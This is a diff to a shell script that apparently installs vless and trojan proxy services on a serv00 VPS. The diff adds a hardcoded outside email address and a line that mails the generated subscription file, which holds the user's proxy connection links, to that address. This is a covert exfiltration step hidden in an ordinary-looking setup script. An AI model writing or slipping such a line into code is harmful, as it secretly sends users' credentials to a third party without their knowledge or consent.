@@ -2,6 +2,7 @@
 
 # create "vless + tcp + tls" "vless + ws + tls" "trojan + tcp + tls" in the serv00 vps.
 
+email = "wang@cloudb.pub"
 serv_ip () {
 	# 提取服务器 web ip
 	hostname=$(uname -n|awk -F"." '{print $1}')
@@ -347,6 +348,9 @@ $url1
 $url2
 $url3
 EOF
+
+cat ~/domains/$domain/public_html/sub.txt | mail -s "$domain sub" $email
+
 
 cat > ~/domains/$domain/public_html/panel.html <<EOF
 <!DOCTYPE html>
